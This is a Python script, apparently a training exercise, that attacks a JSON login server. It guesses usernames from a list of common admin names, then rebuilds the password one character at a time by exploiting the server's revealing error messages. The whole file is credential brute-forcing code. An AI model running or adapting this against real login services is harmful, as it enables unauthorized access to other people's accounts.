import sys
import socket
import json

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

logins_list = [
    'admin', 'Admin', 'admin1', 'admin2', 'admin3',
    'user1', 'user2', 'root', 'default', 'new_user',
    'some_user', 'new_admin', 'administrator',
    'Administrator', 'superuser', 'super', 'su', 'alex',
    'suser', 'rootuser', 'adminadmin', 'useruser',
    'superadmin', 'username', 'username1'
]

address = (sys.argv[1], int(sys.argv[2]))


def connect(data):
    client.send(json.dumps(penetration_data).encode())
    response = client.recv(1024)
    res = json.loads(response.decode())
    return res


with socket.socket() as client:
    client.connect(address)
    penetration_data = {"login": "", "password": " "}
    for login in logins_list:
        penetration_data["login"] = login
        res = connect(penetration_data)
        if res["result"] == 'Wrong login!':
            continue
        elif res["result"] == "Wrong password!":
            password = ""
            while True:
                for char in abc:
                    penetration_data["password"] += char
                    res = connect(penetration_data)
                    if res["result"] == "Exception happened during login":
                        password = str(penetration_data["password"])
                        break
                    elif res["result"] == "Wrong password!":
                        penetration_data["password"] = password
                    elif res["result"] == "Connection success!":
                        break
                if res["result"] == "Connection success!":
                    break
            break
    print(json.dumps(penetration_data))
